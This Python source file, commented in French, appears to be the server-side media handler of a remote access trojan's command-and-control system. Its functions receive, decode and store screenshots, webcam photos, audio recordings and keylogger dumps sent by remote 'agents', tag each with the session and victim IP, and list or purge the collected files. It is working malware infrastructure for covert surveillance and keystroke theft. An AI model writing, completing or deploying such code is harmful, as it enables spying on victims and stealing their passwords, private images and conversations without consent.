"""
Media Handler - Gestionnaire des médias côté serveur
Gestion des screenshots, webcam, audio et keylogger
"""

import os
import base64
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional
import logging

from server.utils.config import ServerConfig
from shared.exceptions import MediaException

logger = logging.getLogger(__name__)

class MediaHandler:
    """Gestionnaire des médias du serveur"""
    
    def __init__(self, config: ServerConfig):
        self.config = config
        
        # Répertoires de médias
        self.media_dir = os.path.join(config.DATA_DIR, "media")
        self.screenshots_dir = os.path.join(self.media_dir, "screenshots")
        self.webcam_dir = os.path.join(self.media_dir, "webcam")
        self.audio_dir = os.path.join(self.media_dir, "audio")
        self.keylog_dir = os.path.join(self.media_dir, "keylogs")
        
        # Statistiques
        self.screenshots_received = 0
        self.webcam_images_received = 0
        self.audio_files_received = 0
        self.keylog_dumps_received = 0
        self.total_media_size = 0
        
        # Création des répertoires
        self._ensure_directories()
        
        logger.info("MediaHandler initialisé")
    
    def _ensure_directories(self):
        """S'assure que tous les répertoires de médias existent"""
        directories = [
            self.media_dir,
            self.screenshots_dir,
            self.webcam_dir,
            self.audio_dir,
            self.keylog_dir
        ]
        
        for directory in directories:
            try:
                os.makedirs(directory, exist_ok=True)
            except Exception as e:
                logger.error(f"Impossible de créer le répertoire {directory}: {e}")
    
    def handle_screenshot(self, session, screenshot_data: Dict[str, Any]) -> str:
        """
        Traite la réception d'une capture d'écran
        
        Args:
            session: Session de l'agent
            screenshot_data: Données de capture d'écran
        
        Returns:
            str: Message de résultat
        """
        try:
            if screenshot_data.get('status') != 'success':
                error_msg = screenshot_data.get('output', 'Erreur inconnue')
                return f"[!] Erreur capture d'écran: {error_msg}"
            
            # Extraction des données
            file_data = screenshot_data.get('file_data', '')
            filename = screenshot_data.get('filename', 'screenshot.jpg')
            file_size = screenshot_data.get('size', 0)
            timestamp = screenshot_data.get('timestamp', datetime.now().isoformat())
            
            if not file_data:
                return "[!] Données de capture d'écran manquantes"
            
            # Décodage base64
            try:
                decoded_data = base64.b64decode(file_data)
            except Exception as e:
                logger.error(f"Erreur décodage screenshot: {e}")
                return "[!] Erreur lors du décodage de l'image"
            
            # Génération du nom de fichier sécurisé
            safe_filename = self._generate_media_filename(session.id, filename, "screenshot")
            file_path = os.path.join(self.screenshots_dir, safe_filename)
            
            # Sauvegarde de l'image
            try:
                with open(file_path, 'wb') as f:
                    f.write(decoded_data)
                
                # Sauvegarde des métadonnées
                self._save_media_metadata(file_path, {
                    'type': 'screenshot',
                    'session_id': session.id,
                    'agent_ip': session.address[0],
                    'original_filename': filename,
                    'capture_time': timestamp,
                    'file_size': len(decoded_data),
                    'file_hash': hashlib.sha256(decoded_data).hexdigest(),
                    'resolution': screenshot_data.get('resolution', 'Unknown')
                })
                
                # Mise à jour des statistiques
                self.screenshots_received += 1
                self.total_media_size += len(decoded_data)
                
                logger.info(f"Screenshot reçu: {safe_filename} ({len(decoded_data)} bytes) de {session.id}")
                
                return f"[+] Capture d'écran sauvegardée: {safe_filename}"
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde screenshot: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur traitement screenshot: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def handle_webcam_snapshot(self, session, webcam_data: Dict[str, Any]) -> str:
        """
        Traite la réception d'une photo webcam
        
        Args:
            session: Session de l'agent
            webcam_data: Données de photo webcam
        
        Returns:
            str: Message de résultat
        """
        try:
            if webcam_data.get('status') != 'success':
                error_msg = webcam_data.get('output', 'Erreur inconnue')
                return f"[!] Erreur photo webcam: {error_msg}"
            
            # Extraction des données
            file_data = webcam_data.get('file_data', '')
            filename = webcam_data.get('filename', 'webcam_snapshot.jpg')
            file_size = webcam_data.get('size', 0)
            timestamp = webcam_data.get('timestamp', datetime.now().isoformat())
            resolution = webcam_data.get('resolution', (0, 0))
            
            if not file_data:
                return "[!] Données de photo webcam manquantes"
            
            # Décodage base64
            try:
                decoded_data = base64.b64decode(file_data)
            except Exception as e:
                logger.error(f"Erreur décodage webcam: {e}")
                return "[!] Erreur lors du décodage de l'image"
            
            # Génération du nom de fichier sécurisé
            safe_filename = self._generate_media_filename(session.id, filename, "webcam")
            file_path = os.path.join(self.webcam_dir, safe_filename)
            
            # Sauvegarde de l'image
            try:
                with open(file_path, 'wb') as f:
                    f.write(decoded_data)
                
                # Sauvegarde des métadonnées
                self._save_media_metadata(file_path, {
                    'type': 'webcam_snapshot',
                    'session_id': session.id,
                    'agent_ip': session.address[0],
                    'original_filename': filename,
                    'capture_time': timestamp,
                    'file_size': len(decoded_data),
                    'file_hash': hashlib.sha256(decoded_data).hexdigest(),
                    'resolution': f"{resolution[0]}x{resolution[1]}" if isinstance(resolution, tuple) else str(resolution)
                })
                
                # Mise à jour des statistiques
                self.webcam_images_received += 1
                self.total_media_size += len(decoded_data)
                
                logger.info(f"Photo webcam reçue: {safe_filename} ({len(decoded_data)} bytes) de {session.id}")
                
                return f"[+] Photo webcam sauvegardée: {safe_filename}"
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde webcam: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur traitement webcam: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def handle_audio_recording(self, session, audio_data: Dict[str, Any]) -> str:
        """
        Traite la réception d'un enregistrement audio
        
        Args:
            session: Session de l'agent
            audio_data: Données audio
        
        Returns:
            str: Message de résultat
        """
        try:
            if audio_data.get('status') != 'success':
                error_msg = audio_data.get('output', 'Erreur inconnue')
                return f"[!] Erreur enregistrement audio: {error_msg}"
            
            # Extraction des données
            file_data = audio_data.get('file_data', '')
            filename = audio_data.get('filename', 'audio_recording.wav')
            file_size = audio_data.get('file_size', 0)
            duration = audio_data.get('duration', 0)
            sample_rate = audio_data.get('sample_rate', 16000)
            channels = audio_data.get('channels', 1)
            timestamp = audio_data.get('timestamp', datetime.now().isoformat())
            
            if not file_data:
                return "[!] Données audio manquantes"
            
            # Décodage base64
            try:
                decoded_data = base64.b64decode(file_data)
            except Exception as e:
                logger.error(f"Erreur décodage audio: {e}")
                return "[!] Erreur lors du décodage de l'audio"
            
            # Génération du nom de fichier sécurisé
            safe_filename = self._generate_media_filename(session.id, filename, "audio")
            file_path = os.path.join(self.audio_dir, safe_filename)
            
            # Sauvegarde du fichier audio
            try:
                with open(file_path, 'wb') as f:
                    f.write(decoded_data)
                
                # Sauvegarde des métadonnées
                self._save_media_metadata(file_path, {
                    'type': 'audio_recording',
                    'session_id': session.id,
                    'agent_ip': session.address[0],
                    'original_filename': filename,
                    'record_time': timestamp,
                    'file_size': len(decoded_data),
                    'file_hash': hashlib.sha256(decoded_data).hexdigest(),
                    'duration': duration,
                    'sample_rate': sample_rate,
                    'channels': channels
                })
                
                # Mise à jour des statistiques
                self.audio_files_received += 1
                self.total_media_size += len(decoded_data)
                
                logger.info(f"Audio reçu: {safe_filename} ({duration}s, {len(decoded_data)} bytes) de {session.id}")
                
                return f"[+] Enregistrement audio sauvegardé: {safe_filename} ({duration}s)"
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde audio: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur traitement audio: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def handle_keylogger_dump(self, session, keylog_data: Dict[str, Any]) -> str:
        """
        Traite la réception d'un dump de keylogger
        
        Args:
            session: Session de l'agent
            keylog_data: Données de keylogger
        
        Returns:
            str: Message de résultat
        """
        try:
            if keylog_data.get('status') != 'success':
                error_msg = keylog_data.get('output', 'Erreur inconnue')
                return f"[!] Erreur keylogger: {error_msg}"
            
            # Extraction des données
            logs = keylog_data.get('logs', '')
            statistics = keylog_data.get('statistics', {})
            session_duration = keylog_data.get('session_duration', 0)
            keystrokes_captured = statistics.get('total_keystrokes', 0)
            
            if not logs:
                return "[!] Aucun log de frappe disponible"
            
            # Génération du nom de fichier
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"keylog_{session.id}_{timestamp}.txt"
            file_path = os.path.join(self.keylog_dir, filename)
            
            # Sauvegarde des logs
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"Keylogger Dump - {timestamp}\\n")
                    f.write("=" * 50 + "\\n")
                    f.write(f"Session: {session.id}\\n")
                    f.write(f"Agent IP: {session.address[0]}\\n")
                    f.write(f"Duration: {session_duration:.1f}s\\n")
                    f.write(f"Keystrokes: {keystrokes_captured}\\n")
                    f.write("=" * 50 + "\\n\\n")
                    f.write("⚠️ CONTENU FILTRÉ POUR LA SÉCURITÉ ⚠️\\n\\n")
                    f.write(logs)
                
                # Sauvegarde des métadonnées
                self._save_media_metadata(file_path, {
                    'type': 'keylogger_dump',
                    'session_id': session.id,
                    'agent_ip': session.address[0],
                    'dump_time': datetime.now().isoformat(),
                    'file_size': len(logs.encode('utf-8')),
                    'session_duration': session_duration,
                    'keystrokes_captured': keystrokes_captured,
                    'statistics': statistics
                })
                
                # Mise à jour des statistiques
                self.keylog_dumps_received += 1
                self.total_media_size += len(logs.encode('utf-8'))
                
                logger.info(f"Keylog dump reçu: {filename} ({keystrokes_captured} frappes) de {session.id}")
                
                return f"[+] Dump keylogger sauvegardé: {filename} ({keystrokes_captured} frappes, {session_duration:.1f}s)"
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde keylog: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur traitement keylog: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def list_media_files(self, media_type: str = None, session_id: str = None) -> Dict[str, Any]:
        """
        Liste les fichiers médias
        
        Args:
            media_type: Type de média ('screenshot', 'webcam', 'audio', 'keylog')
            session_id: ID de session pour filtrer
        
        Returns:
            Dict avec la liste des fichiers
        """
        try:
            files = []
            
            # Détermination des répertoires à scanner
            if media_type:
                if media_type == 'screenshot':
                    directories = [('screenshot', self.screenshots_dir)]
                elif media_type == 'webcam':
                    directories = [('webcam', self.webcam_dir)]
                elif media_type == 'audio':
                    directories = [('audio', self.audio_dir)]
                elif media_type == 'keylog':
                    directories = [('keylog', self.keylog_dir)]
                else:
                    return {'files': [], 'count': 0, 'error': f'Type de média inconnu: {media_type}'}
            else:
                directories = [
                    ('screenshot', self.screenshots_dir),
                    ('webcam', self.webcam_dir),
                    ('audio', self.audio_dir),
                    ('keylog', self.keylog_dir)
                ]
            
            # Scan des répertoires
            for dir_type, directory in directories:
                if not os.path.exists(directory):
                    continue
                
                for filename in os.listdir(directory):
                    file_path = os.path.join(directory, filename)
                    
                    if not os.path.isfile(file_path) or filename.endswith('.meta'):
                        continue
                    
                    # Lecture des métadonnées
                    metadata = self._load_media_metadata(file_path)
                    
                    # Filtrage par session si demandé
                    if session_id and metadata.get('session_id') != session_id:
                        continue
                    
                    file_info = {
                        'filename': filename,
                        'type': dir_type,
                        'size': os.path.getsize(file_path),
                        'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                        'path': file_path
                    }
                    
                    # Ajout des métadonnées si disponibles
                    if metadata:
                        file_info.update(metadata)
                    
                    files.append(file_info)
            
            # Tri par date (plus récent en premier)
            files.sort(key=lambda x: x.get('modified', ''), reverse=True)
            
            return {
                'files': files,
                'count': len(files),
                'total_size': sum(f['size'] for f in files)
            }
            
        except Exception as e:
            logger.error(f"Erreur listing médias: {e}")
            return {'files': [], 'count': 0, 'error': str(e)}
    
    def get_media_stats(self) -> Dict[str, Any]:
        """Retourne les statistiques des médias"""
        return {
            'screenshots_received': self.screenshots_received,
            'webcam_images_received': self.webcam_images_received,
            'audio_files_received': self.audio_files_received,
            'keylog_dumps_received': self.keylog_dumps_received,
            'total_media_size': self.total_media_size,
            'directories': {
                'media': self.media_dir,
                'screenshots': self.screenshots_dir,
                'webcam': self.webcam_dir,
                'audio': self.audio_dir,
                'keylog': self.keylog_dir
            }
        }
    
    def _generate_media_filename(self, session_id: str, original_filename: str, media_type: str) -> str:
        """
        Génère un nom de fichier sécurisé pour les médias
        
        Args:
            session_id: ID de la session
            original_filename: Nom de fichier original
            media_type: Type de média
        
        Returns:
            str: Nom de fichier sécurisé
        """
        # Nettoyage du nom de fichier original
        safe_name = "".join(c for c in original_filename if c.isalnum() or c in "._-")
        safe_name = safe_name.strip()
        
        if not safe_name:
            safe_name = f"{media_type}_file"
        
        # Ajout du timestamp et de l'ID de session
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Séparation du nom et de l'extension
        name, ext = os.path.splitext(safe_name)
        
        return f"{timestamp}_{session_id}_{media_type}_{name}{ext}"
    
    def _save_media_metadata(self, file_path: str, metadata: Dict[str, Any]):
        """Sauvegarde les métadonnées d'un fichier média"""
        try:
            import json
            
            metadata_path = file_path + '.meta'
            with open(metadata_path, 'w', encoding='utf-8') as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            logger.warning(f"Impossible de sauvegarder les métadonnées: {e}")
    
    def _load_media_metadata(self, file_path: str) -> Dict[str, Any]:
        """Charge les métadonnées d'un fichier média"""
        try:
            import json
            
            metadata_path = file_path + '.meta'
            if os.path.exists(metadata_path):
                with open(metadata_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            
            return {}
            
        except Exception as e:
            logger.warning(f"Impossible de charger les métadonnées: {e}")
            return {}
    
    def cleanup_old_media(self, max_age_days: int = 7) -> int:
        """
        Nettoie les anciens fichiers médias
        
        Args:
            max_age_days: Âge maximum en jours
        
        Returns:
            int: Nombre de fichiers supprimés
        """
        try:
            import time
            
            deleted_count = 0
            current_time = time.time()
            max_age_seconds = max_age_days * 24 * 3600
            
            directories = [
                self.screenshots_dir,
                self.webcam_dir,
                self.audio_dir,
                self.keylog_dir
            ]
            
            for directory in directories:
                if not os.path.exists(directory):
                    continue
                
                for filename in os.listdir(directory):
                    file_path = os.path.join(directory, filename)
                    
                    if not os.path.isfile(file_path):
                        continue
                    
                    # Vérification de l'âge du fichier
                    file_age = current_time - os.path.getmtime(file_path)
                    
                    if file_age > max_age_seconds:
                        try:
                            os.unlink(file_path)
                            
                            # Suppression des métadonnées
                            metadata_path = file_path + '.meta'
                            if os.path.exists(metadata_path):
                                os.unlink(metadata_path)
                            
                            deleted_count += 1
                            logger.info(f"Ancien fichier média supprimé: {filename}")
                            
                        except Exception as e:
                            logger.error(f"Erreur suppression {filename}: {e}")
            
            return deleted_count
            
        except Exception as e:
            logger.error(f"Erreur nettoyage médias: {e}")
            return 0